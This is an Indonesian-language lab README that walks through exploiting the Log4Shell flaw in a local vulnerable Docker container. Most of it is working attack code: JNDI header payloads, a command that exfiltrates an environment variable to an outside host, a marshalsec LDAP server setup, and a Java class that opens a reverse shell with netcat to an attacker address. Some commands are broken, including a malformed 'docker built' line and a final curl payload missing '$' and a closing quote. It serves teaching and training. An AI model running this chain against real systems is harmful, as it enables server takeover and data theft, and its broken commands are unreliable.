# Lab4Exploit

## Requirements:
- Linux disarankan Kali/Ubuntu
- Docker
```sh
# install docker
sudo apt install docker.io
sudo systemctl enable docker --now

# masukkan user ke dalam docker gruup
sudo usermod -aG docker $USER

# logout akun kemudian login kembali
```

- Java, Java Compiler dan Java Web Start versi 8 (untuk eksploitasi). Melihat versi Java:
```sh
sudo update-alternatives --config java
sudo update-alternatives --config javac
sudo update-alternatives --config javaws
```

- Installasi Java
```sh
sudo apt install default-jdk
```

- Installasi Maven
```sh
sudo apt install maven
```

- Marshalsec
```sh
git clone https://github.com/mbechler/marshalsec

cd marshalsec

mvn clean package -DskipTests

```

## Persiapan
Setup Vulnerable Server
```sh
# ambil dan build dockerfile
git clone https://github.com/leonjza/log4jpwn.git
docker built -t log4jpwn

# jalankan dockerfile yang sudah dib-uild
docker run --rm -p8080:8080 log4jpwn
```


## Reconnaissance
Buka URL http://localhost:8080 pada browser.

> Website ini melakukan logging terhadap user-agent, path, dan parameter pwn.
> Untuk PoC pada proses logging user-agent, kamu dapat menggunakan curl

Buka URL dengan menggunakan curl
```sh
curl -v http://localhost:8080

curl -v -H 'User-Agent: Internet Explorer' http://localhost:8080
```
> Lihat interaksi yang kamu lakukan dengan Log4j pada server

**PoC 1**
Buka tab baru dan buka necat listener
```sh
nc -lnvp 1234
```

Alamat listener dapat dilihat pada `ifconfig` dan mengacu pada interface Docker0.
```sh
curl -v -H 'User-Agent: ${jndi:ldap://ALAMAT_LISTENER:1234}' http://localhost:8080
```
**PoC2**
Buka https://log4shell.huntress.com
```sh
curl -v -H 'User-Agent: ${jndi:ldap://log4shell.huntress.com:1389/ID}' http://localhost:8080
```

Data exfiltration
```sh
curl -v -H 'User-Agent: ${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/ID}' http://localhost:8080/
```

## Eksploitasi
Menggunakan Java unmarshaller security, membuat code execution.
```sh
cd marshalsec

# jalankan ldap exploit server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
```

File Exploit.java
```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Compile file tersebut
```sh
javac Exploit.java -source 8 -target 8
```

Buat HTTP server pada port 8000
```sh
python3 -m http.server
```

Nyalakan listener
```sh
nc -lnvp 9999
```

Eksploit
```sh
curl -H 'User-Agent: {jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\} http://localhost:8080
```






